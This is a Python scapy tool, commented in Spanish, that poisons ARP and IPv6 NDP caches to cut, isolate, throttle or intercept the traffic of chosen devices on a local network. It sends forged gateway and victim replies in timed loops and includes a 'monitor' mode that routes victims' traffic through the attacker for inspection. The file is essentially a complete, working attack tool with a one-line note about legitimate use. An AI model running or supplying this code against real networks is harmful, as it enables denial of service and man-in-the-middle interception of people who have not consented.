"""Gestor de bloqueo ARP multi-dispositivo.

Sustituye a script.py: en lugar de una sola víctima con una global
`ataque_activo`, maneja N objetivos a la vez, cada uno con su hilo y su
threading.Event, y restaura las tablas ARP al desbloquear para no dejar la
red rota.

USO LEGÍTIMO: solo en una red que administras/posees.
"""
from __future__ import annotations

import threading
import time
from dataclasses import dataclass, field

from collections import defaultdict

from scapy.all import (
    ARP,
    ICMPv6ND_NA,
    IP,
    IPv6,
    ICMPv6NDOptDstLLAddr,
    Ether,
    send,
    sendp,
    sniff,
)

from net import discover_ipv6, get_gateway_ip, get_ipv6_gateway, get_mac

# MAC "agujero negro": al bloquear le decimos a la víctima que el gateway está
# en esta MAC inexistente, así su tráfico se va a la nada (no pasa por nosotros,
# bloqueo más limpio y sin cargar el PC). MAC localmente administrada y bogus.
BLACKHOLE_MAC = "02:00:00:00:00:fe"


class TrafficCounter:
    """Cuenta bytes IP (subida+bajada) por dispositivo, para el límite de datos."""

    def __init__(self):
        self.bytes: dict[str, int] = defaultdict(int)
        self._stop = threading.Event()
        self._thread: threading.Thread | None = None

    def _on(self, pkt) -> None:
        try:
            if pkt.haslayer(IP):
                n = len(pkt)
                self.bytes[pkt[IP].src] += n
                self.bytes[pkt[IP].dst] += n
            elif pkt.haslayer(IPv6):
                n = len(pkt)
                self.bytes[pkt[IPv6].src] += n
                self.bytes[pkt[IPv6].dst] += n
        except Exception:
            pass

    def start(self) -> None:
        if self._thread and self._thread.is_alive():
            return
        self._stop.clear()
        self._thread = threading.Thread(target=self._run, daemon=True)
        self._thread.start()

    def _run(self) -> None:
        sniff(filter="ip or ip6", prn=self._on, store=0,
              stop_filter=lambda _: self._stop.is_set())

    def stop(self) -> None:
        self._stop.set()

    def used(self, ip: str) -> int:
        return self.bytes.get(ip, 0)

    def reset(self, ip: str) -> None:
        self.bytes[ip] = 0


@dataclass
class Target:
    ip: str
    mac: str | None
    stop: threading.Event = field(default_factory=threading.Event)
    thread: threading.Thread | None = None
    expires_at: float | None = None  # epoch; None = indefinido
    # "block" corta internet · "monitor" redirige · "expel" aísla de toda la red
    # · "limit" deja pasar hasta un tope de datos y luego corta
    mode: str = "block"
    ip6: str | None = None          # IPv6 link-local de la víctima (si hay)
    peers: list[str] = field(default_factory=list)  # otros hosts (modo expel)
    cap_bytes: int | None = None    # tope de datos (modo limit)
    base_bytes: int = 0             # bytes ya contados al empezar el límite
    over: bool = False              # ya superó el tope (modo limit)


class BlockManager:
    """Bloquea/desbloquea varios dispositivos por ARP (+ NDP IPv6) en paralelo."""

    def __init__(self, gateway_ip: str | None = None, interval: float = 1.0):
        self.gateway_ip = gateway_ip or get_gateway_ip()
        self.gateway_mac = get_mac(self.gateway_ip)
        self.interval = interval
        # IPv6 del router (link-local). Si hay IPv6, también lo envenenamos para
        # que los equipos modernos (iPhones) no se escapen del bloqueo por IPv6.
        self.gateway_ip6 = get_ipv6_gateway()
        self._targets: dict[str, Target] = {}
        self._lock = threading.Lock()
        self._counter: TrafficCounter | None = None  # se crea al primer "limit"
        if not self.gateway_mac:
            raise RuntimeError(
                f"No se pudo resolver la MAC del gateway {self.gateway_ip}. "
                "¿Estás como root/admin y en la red correcta?"
            )

    # ---- API pública -------------------------------------------------
    def block(self, ip: str, duration: float | None = None,
              mode: str = "block", peers: list[str] | None = None,
              cap_mb: float | None = None) -> bool:
        """Empieza a envenenar una IP. Devuelve False si ya estaba o sin MAC.

        mode:
          - "block"   corta internet (ARP+NDP a MAC agujero negro).
          - "monitor" redirige por nosotros para inspeccionar (requiere fwd).
          - "expel"   aísla de TODA la red: corta internet y el acceso a los
                      demás hosts (`peers`).
          - "limit"   deja pasar hasta `cap_mb` MB y luego corta (requiere fwd).

        Si `duration` (segundos) se indica, expira solo; usa `expired()` desde
        el bucle de refresco para desbloquear los vencidos.
        """
        with self._lock:
            if ip in self._targets:
                return False
            mac = get_mac(ip)
            if not mac:
                return False
            target = Target(ip=ip, mac=mac, mode=mode, peers=peers or [])
            if duration:
                target.expires_at = time.time() + duration
            # Para cortar (block/expel), descubre IPv6 para cortar también NDP.
            if mode in ("block", "expel") and self.gateway_ip6:
                target.ip6 = discover_ipv6(mac)
            # Modo límite: arranca el contador de tráfico y fija el tope.
            if mode == "limit" and cap_mb:
                if self._counter is None:
                    self._counter = TrafficCounter()
                    self._counter.start()
                target.cap_bytes = int(cap_mb * 1024 * 1024)
                target.base_bytes = self._counter.used(ip)
            # Ráfaga inicial: corte/redirección inmediato, sin esperar al ciclo.
            self._poison_once(target, burst=5)
            target.thread = threading.Thread(
                target=self._poison_loop, args=(target,), daemon=True
            )
            self._targets[ip] = target
            target.thread.start()
            return True

    def unblock(self, ip: str) -> bool:
        """Detiene el bloqueo de una IP y restaura su ARP."""
        with self._lock:
            target = self._targets.pop(ip, None)
        if not target:
            return False
        target.stop.set()
        if target.thread:
            target.thread.join(timeout=self.interval + 1)
        self._restore(target)
        # Si ya no queda ningún límite activo, apaga el contador de tráfico.
        if self._counter and not any(
                t.mode == "limit" for t in self._targets.values()):
            self._counter.stop()
            self._counter = None
        return True

    def unblock_all(self) -> None:
        for ip in list(self._targets.keys()):
            self.unblock(ip)
        if self._counter:
            self._counter.stop()
            self._counter = None

    def blocked_ips(self) -> list[str]:
        """IPs que están cortando tráfico (block/expel, o limit ya superado)."""
        with self._lock:
            return [ip for ip, t in self._targets.items()
                    if t.mode in ("block", "expel")
                    or (t.mode == "limit" and t.over)]

    def is_blocked(self, ip: str) -> bool:
        t = self._targets.get(ip)
        return t is not None and t.mode == "block"

    def is_expelling(self, ip: str) -> bool:
        t = self._targets.get(ip)
        return t is not None and t.mode == "expel"

    def is_monitoring(self, ip: str) -> bool:
        t = self._targets.get(ip)
        return t is not None and t.mode == "monitor"

    def is_limiting(self, ip: str) -> bool:
        t = self._targets.get(ip)
        return t is not None and t.mode == "limit"

    def limit_info(self, ip: str) -> tuple[float, float, bool] | None:
        """(MB usados, MB tope, superado) de un objetivo en modo límite."""
        t = self._targets.get(ip)
        if not t or t.mode != "limit" or t.cap_bytes is None:
            return None
        usados = 0
        if self._counter:
            usados = max(0, self._counter.used(ip) - t.base_bytes)
        return (usados / 1048576, t.cap_bytes / 1048576, t.over)

    def is_active(self, ip: str) -> bool:
        """¿Hay envenenamiento activo sobre esta IP (cualquier modo)?"""
        return ip in self._targets

    def remaining(self, ip: str) -> float | None:
        """Segundos restantes de un bloqueo temporizado; None si es indefinido."""
        target = self._targets.get(ip)
        if not target or target.expires_at is None:
            return None
        return max(0.0, target.expires_at - time.time())

    def expired(self) -> list[str]:
        """IPs cuyo bloqueo temporizado ya venció (para auto-desbloquear)."""
        now = time.time()
        with self._lock:
            return [
                ip for ip, t in self._targets.items()
                if t.expires_at is not None and now >= t.expires_at
            ]

    # ---- Interno -----------------------------------------------------
    def _corta(self, target: Target) -> bool:
        """¿Este objetivo debe CORTAR el tráfico (agujero negro)?"""
        if target.mode in ("block", "expel"):
            return True
        if target.mode == "limit":
            return target.over  # corta solo cuando ya superó el tope
        return False  # monitor: redirige, no corta

    def _poison_once(self, target: Target, burst: int = 1) -> None:
        """Un envío (o ráfaga) de envenenamiento IPv4 ARP + IPv6 NDP."""
        # Si corta -> MAC agujero negro; si redirige (monitor/limit bajo tope) ->
        # NUESTRA MAC (hwsrc=None deja que scapy ponga la nuestra).
        corta = self._corta(target)
        hwsrc = BLACKHOLE_MAC if corta else None
        # IPv4: a la víctima le mentimos sobre el gateway, y al gateway sobre ella.
        send(ARP(op=2, pdst=target.ip, psrc=self.gateway_ip,
                 hwdst=target.mac, hwsrc=hwsrc), count=burst, verbose=0)
        send(ARP(op=2, pdst=self.gateway_ip, psrc=target.ip,
                 hwdst=self.gateway_mac, hwsrc=hwsrc), count=burst, verbose=0)
        # Expulsar: además aísla de los demás hosts de la red (peers).
        if target.mode == "expel":
            for peer in target.peers:
                if peer in (target.ip, self.gateway_ip):
                    continue
                send(ARP(op=2, pdst=target.ip, psrc=peer,
                         hwdst=target.mac, hwsrc=BLACKHOLE_MAC),
                     count=burst, verbose=0)
        # IPv6: envenena NDP cuando se corta y hay IPv6.
        if corta and target.ip6 and self.gateway_ip6:
            self._ndp_poison(target, BLACKHOLE_MAC, burst)

    def _ndp_poison(self, target: Target, lladdr: str, burst: int) -> None:
        """Envenena la cache NDP: víctima<->router IPv6 apuntan a `lladdr`."""
        try:
            # A la víctima: "el router IPv6 (gateway6) está en lladdr".
            sendp(
                Ether(dst=target.mac)
                / IPv6(src=self.gateway_ip6, dst=target.ip6)
                / ICMPv6ND_NA(tgt=self.gateway_ip6, R=1, S=0, O=1)
                / ICMPv6NDOptDstLLAddr(lladdr=lladdr),
                count=burst, verbose=0,
            )
            # Al router: "la víctima (ip6) está en lladdr".
            sendp(
                Ether(dst=self.gateway_mac)
                / IPv6(src=target.ip6, dst=self.gateway_ip6)
                / ICMPv6ND_NA(tgt=target.ip6, R=0, S=0, O=1)
                / ICMPv6NDOptDstLLAddr(lladdr=lladdr),
                count=burst, verbose=0,
            )
        except Exception:
            pass

    def _poison_loop(self, target: Target) -> None:
        while not target.stop.is_set():
            # Modo límite: si ya consumió el tope, pasa a cortar (y descubre su
            # IPv6 la primera vez para cortar también NDP).
            if (target.mode == "limit" and not target.over
                    and target.cap_bytes is not None and self._counter):
                usado = self._counter.used(target.ip) - target.base_bytes
                if usado >= target.cap_bytes:
                    target.over = True
                    if self.gateway_ip6 and not target.ip6:
                        target.ip6 = discover_ipv6(target.mac)
                    self._poison_once(target, burst=5)  # corte inmediato
            self._poison_once(target)
            target.stop.wait(self.interval)

    def _restore(self, target: Target, count: int = 5) -> None:
        if not target.mac or not self.gateway_mac:
            return
        # IPv4: restaura a víctima y gateway con las MAC reales.
        send(ARP(op=2, pdst=target.ip, psrc=self.gateway_ip,
                 hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.gateway_mac),
             count=count, verbose=0)
        send(ARP(op=2, pdst=self.gateway_ip, psrc=target.ip,
                 hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target.mac),
             count=count, verbose=0)
        # IPv6: si envenenamos NDP, corrige la cache con las MAC reales.
        if target.ip6 and self.gateway_ip6:
            try:
                # A la víctima: el router IPv6 vuelve a estar en su MAC real.
                sendp(
                    Ether(dst=target.mac)
                    / IPv6(src=self.gateway_ip6, dst=target.ip6)
                    / ICMPv6ND_NA(tgt=self.gateway_ip6, R=1, S=0, O=1)
                    / ICMPv6NDOptDstLLAddr(lladdr=self.gateway_mac),
                    count=count, verbose=0,
                )
                # Al router: la víctima vuelve a estar en su MAC real.
                sendp(
                    Ether(dst=self.gateway_mac)
                    / IPv6(src=target.ip6, dst=self.gateway_ip6)
                    / ICMPv6ND_NA(tgt=target.ip6, R=0, S=0, O=1)
                    / ICMPv6NDOptDstLLAddr(lladdr=target.mac),
                    count=count, verbose=0,
                )
            except Exception:
                pass


if __name__ == "__main__":
    import sys

    mgr = BlockManager()
    print(f"Gateway {mgr.gateway_ip} ({mgr.gateway_mac})")
    print("IPs a bloquear separadas por espacio (Ctrl+C para salir):")
    try:
        for ip in sys.argv[1:]:
            print("bloqueando" if mgr.block(ip) else "no se pudo", ip)
        while mgr.blocked_ips():
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nRestaurando red...")
        mgr.unblock_all()
